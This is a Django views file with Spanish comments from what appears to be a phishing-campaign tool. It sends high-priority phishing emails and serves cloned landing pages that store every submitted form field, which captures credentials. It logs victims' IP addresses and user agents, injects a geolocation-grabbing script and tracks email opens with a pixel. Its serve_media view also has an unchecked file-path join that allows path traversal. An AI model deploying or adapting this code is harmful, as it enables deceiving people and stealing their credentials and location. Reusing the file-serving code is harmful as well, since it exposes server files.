from django.shortcuts import render, redirect, get_object_or_404
from django.contrib import messages
from .models import SMTP,LandingPage, CampaignResult
from .forms import SMTPForm, TestSMTPForm
import smtplib
from email.mime.text import MIMEText
from django.contrib.auth.decorators import login_required
from django.contrib.auth import authenticate, login
from django.contrib.auth.forms import AuthenticationForm
from django.urls import reverse
from bs4 import BeautifulSoup
from django.views.decorators.http import require_GET
from django.utils import timezone
from django.http import HttpResponse
from .models import CampaignResult
from django.views.decorators.csrf import csrf_exempt
import json
import base64
import os
from django.db.models import Q
import mimetypes
from django.conf import settings
from django.http import FileResponse

def login_view(request):
    if request.method == 'POST':
        form = AuthenticationForm(request, data=request.POST)
        if form.is_valid():
            username = form.cleaned_data.get('username')
            password = form.cleaned_data.get('password')
            user = authenticate(username=username, password=password)
            if user is not None:
                login(request, user)
                return redirect('dashboard')
            else:
                messages.error(request, 'Nombre de usuario o contraseña incorrectos.')
    else:
        form = AuthenticationForm()
    return render(request, 'core/login.html', {'form': form})


def send_phishing_email(smtp_config, to_email, subject, body):
    try:
        from_email = smtp_config.from_address
        with smtplib.SMTP(smtp_config.host, smtp_config.port, timeout=30) as server:
            server.starttls()
            server.login(smtp_config.username, smtp_config.password)
            msg = MIMEText(body, 'html')
            msg['Subject'] = subject
            msg['From'] = from_email
            msg['To'] = to_email
            msg['Importance'] = 'High'  # Marcar el correo como importante
            msg['X-Priority'] = '1'  # Prioridad alta (1 es la más alta, 5 la más baja)
            server.send_message(msg)
    except Exception as e:
        raise Exception(f"Error al enviar correo: {str(e)}")





@csrf_exempt
@login_required
def serve_landing_page(request, url_path, token):
    page = get_object_or_404(LandingPage, url_path=url_path)
    result = get_object_or_404(CampaignResult, token=token, campaign__landing_group=page.landing_group)

    if request.method == 'POST':
        form_data = request.POST.dict()
        
        # Guardar la ubicación si se proporciona
        if 'latitude' in form_data and 'longitude' in form_data:
            result.latitude = form_data['latitude']
            result.longitude = form_data['longitude']
            result.save()
        
        if result.post_data:
            existing_data = json.loads(result.post_data)
            existing_data.update(form_data)
            result.post_data = json.dumps(existing_data)
        else:
            result.post_data = json.dumps(form_data)
        result.status = 'form_submitted'
        result.save()
        
        next_page = LandingPage.objects.filter(landing_group=page.landing_group, order__gt=page.order).order_by('order').first()
        if next_page:
            return redirect('serve_landing_page', url_path=next_page.url_path, token=token)

    if not result.landing_page_opened:
        result.email_opened = True
        result.landing_page_opened = True
        if not result.opened_timestamp:
            result.opened_timestamp = timezone.localtime()
        result.landing_page_opened_timestamp = timezone.localtime()
        result.status = 'landing_page_opened'
        result.ip_address = request.META.get('HTTP_X_FORWARDED_FOR', '').split(',')[0].strip() or request.META.get('REMOTE_ADDR', '')
        result.user_agent = request.META.get('HTTP_USER_AGENT', '')
        result.save()

    soup = BeautifulSoup(page.html_content, 'html.parser')
    form = soup.find('form')
    if form:
        form['action'] = request.build_absolute_uri(reverse('serve_landing_page', args=[url_path, token]))

    # Reemplazar las rutas de las imágenes, CSS, JS y fuentes
    for tag in soup.find_all(['img', 'link', 'script']):
        src = tag.get('src') or tag.get('href')
        if src:
            if src.startswith(('http://', 'https://', '//')):
                continue
            
            # Construir la ruta correcta para los recursos
            correct_path = f"/media/landing_pages/{page.landing_group.name}/{src.lstrip('/')}"
            
            if tag.name == 'img':
                tag['src'] = correct_path
            elif tag.name == 'link':
                tag['href'] = correct_path
            elif tag.name == 'script':
                tag['src'] = correct_path

    # Agregar script para solicitar la ubicación
    location_script = soup.new_tag('script')
    location_script.string = """
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendPosition);
            }
        }
        function sendPosition(position) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", window.location.href, true);
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send("latitude=" + position.coords.latitude + "&longitude=" + position.coords.longitude);
        }
        window.onload = getLocation;
    """
    soup.body.append(location_script)

    return HttpResponse(str(soup))

@require_GET
def track_email_open(request, token):
    if request:
        try:
            result = CampaignResult.objects.get(token=token)
            if not result.email_opened:
                result.email_opened = True
                result.opened_timestamp = timezone.localtime()
                result.status = 'opened'  # Actualiza el estado a 'opened'
                result.save()
        except CampaignResult.DoesNotExist:
            pass
        
        # Devuelve una imagen de 1x1 píxel transparente
        return HttpResponse(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\x00\x00\x00\x21\xF9\x04\x01\x00\x00\x00\x00\x2C\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3B', content_type='image/gif')

def serve_media(request, path):
    file_path = os.path.join(settings.MEDIA_ROOT, path)
    if os.path.exists(file_path):
        return FileResponse(open(file_path, 'rb'))
    return HttpResponse(status=404)
